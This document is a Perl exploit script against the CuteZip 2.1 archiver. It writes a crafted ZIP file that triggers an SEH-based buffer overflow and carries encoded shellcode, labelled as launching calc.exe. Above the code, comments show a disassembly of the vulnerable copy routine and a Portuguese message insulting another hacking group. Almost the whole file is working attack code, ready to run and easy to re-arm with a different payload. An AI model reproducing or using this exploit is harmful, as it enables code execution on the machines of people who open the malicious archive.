#!/usr/bin/perl
#
#[+]Exploit Title: Exploit Buffer Overflow CuteZip 2.1
#[+]Date: 02\12\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.globalscape.com/files/cutezip20b.exe
#[+]Version: 2.1 build 9.24.1
#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN	
#[+]CVE: N/A
#
#            Comment in Brazilian Portuguese
#                       ||
#                       ||
#                       \/    
#
#Comentario para quem é do Brasil:
#
#Ola Lammers Brasileiros Copiando Receitas de Bolos na internet né,
#Um Bando de Lammers que dizem ser o Metasploit Brazil 
#Caras Voces Nao sabem nem Programar em ruby,perl,python,c ou java
#Estude muito,nao suje o no do Metasploit.
#
#Esse Recado foi para o Metasploit Brasil se tiver Achando Ruim 
#Me Contate por E-mail.
#
#
#
#Comment:
#
# The structure of this exploit has zip Copied exploits of the team Corelan
# Link: http://www.exploit-db.com/exploits/11764/
#
#
#                           Vulnerable function
#                                   ||
#									||
#									\/
#
# 0x0047CC0E                     .^72 CC          JB SHORT CuteZip.0047CBDC
# 0x0047CC10                     . F3:A5          REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS>
# 0x0047CC12                     . FF2495 C8CC470>JMP DWORD PTR DS:[EDX*4+47CCC8]
# 0x0047CC19                       8D49 00        LEA ECX,DWORD PTR DS:[ECX]
# 0x0047CC1C                     > 23D1           AND EDX,ECX
# 0x0047CC1E                     . 8A06           MOV AL,BYTE PTR DS:[ESI]
# 0x0047CC20                     . 8807           MOV BYTE PTR DS:[EDI],AL
# 0x0047CC22                     . 8A46 01        MOV AL,BYTE PTR DS:[ESI+1]
# 0x0047CC25                     . C1E9 02        SHR ECX,2
# 0x0047CC28                     . 8847 01        MOV BYTE PTR DS:[EDI+1],AL
# 0x0047CC2B                     . 83C6 02        ADD ESI,2
# 0x0047CC2E                     . 83C7 02        ADD EDI,2
# 0x0047CC31                     . 83F9 08        CMP ECX,8
# 0x0047CC34                     .^72 A6          JB SHORT CuteZip.0047CBDC
# 0x0047CC36                     . F3:A5          REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS>      ===> //Here is the function that occurs Buffer Overflow 
# 0x0047CC38                     . FF2495 C8CC470>JMP DWORD PTR DS:[EDX*4+47CCC8]
# 0x0047CC3F                       90             NOP
# 0x0047CC40                     > 23D1           AND EDX,ECX
# 0x0047CC42                     . 8A06           MOV AL,BYTE PTR DS:[ESI]
# 0x0047CC44                     . 8807           MOV BYTE PTR DS:[EDI],AL
# 0x0047CC46                     . 46             INC ESI
# 0x0047CC47                     . C1E9 02        SHR ECX,2
# 0x0047CC4A                     . 47             INC EDI
# 0x0047CC4B                     . 83F9 08        CMP ECX,8
# 0x0047CC4E                     .^72 8C          JB SHORT CuteZip.0047CBDC
# 0x0047CC50                     . F3:A5          REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS>
# 0x0047CC52                     . FF2495 C8CC470>JMP DWORD PTR DS:[EDX*4+47CCC8]
# 0x0047CC59                       8D49 00        LEA ECX,DWORD PTR DS:[ECX]
#
#
#
#
#
#
#


use IO::File;

if($^O=="windows")
{
system("cls");
system("color 4f");
}
else
{
system("clear");
}


sub banner
{
print q{

[+]Exploit: Exploit Buffer Overflow CuteZip 2.1
[+]Date: 02\\12\\2011
[+]Author: C4SS!0 G0M3S
[+]Home: www.invasao.com.br
[+]E-mail: Louredo_@hotmail.com
[+]Version: 2.1 build 9.24.1
[+]Thanks: Corelan Team, Skylined
[+]Impact: Hich

};
}
my $file = $ARGV[0];


if($#ARGV!=0)
{
banner;
print "[-]Usage: $0 <File Name>\n";
print "[-]Exemple: $0 Exploit.zip\n";

 exit(0);
}
banner;

my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

my $payload = "\x41" x 1148;
my $nseh = "\xeb\x07\x90\x90";
my $seh = pack('V',0x0040112F);

my $egg = "\x41" x 2;
$egg .= "\x61\x61\x61\x51\x58\xFF\xD0";

my $shellcode = "\x41" x 123;

print "[*]Identifying the length Shellcode\n";
sleep(1);

$shellcode = $shellcode.
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIOJDKJTSICL9MYQ8YRTQ4L".
"41K6IXI81WBLCZKKL6QQC4NUSV8KJMKLIY2JJN5RRQJJKMUKKOO9JZ7Z884POWXJJLXSS8CON5XJW912".
"6WONPTLG14NQQOQPMYLMQOSFQUN9FUSTKXQFKQUPL4OIS4W5U1T3FLHQ2EHPKOYKTDWZSHQMQM7MPBKL".#SHELLCODE WinExec("CALC",0);
"KVW7HKWHCNOP2NOKCHNMGNSO8LYMLS0OJTXRUPYQSFKNYFVBZK47DQVNZFBNGWMNPPQPZQV337XMPXCL".
"VLJ0C3C3CVKMWKRL0GWBLSP1NVKBSOUN4V7L8G8WKYNOJ2NMOOKTYTNLFE1XOFOHXHMNPZ5LRKOOUNLK".
"HLUVXGLMWHP7KWNMXSB644O4CEMVCLPO6QJ9KYJPKXJD4LCTYPOTYVTJTLSQ4OGKMRK8SI7D7BNMO2OB".
"K4BX0S5LKNQX14OM8646B9CZOA";

print "[*]The length is Shellcode:".(length($shellcode)-123)."\n";
sleep(1);

my $junk = "\x42" x (4064-length($payload.$nseh.$seh.$egg.$shellcode));

$payload = $payload.$nseh.$seh.$egg.$shellcode.$junk;

$payload = $payload.".txt";
my $Exploit = $ldf_header.$payload.
              $cdf_header.$payload.
			  $eofcdf_header;
print "[*]Creating the file $file\n";
sleep(1);

open(f,">$file")|| die("Error:\n$!\n");
print f $Exploit;
close(f);
print "[*]The File $file Created Successfully\n";
sleep(1);
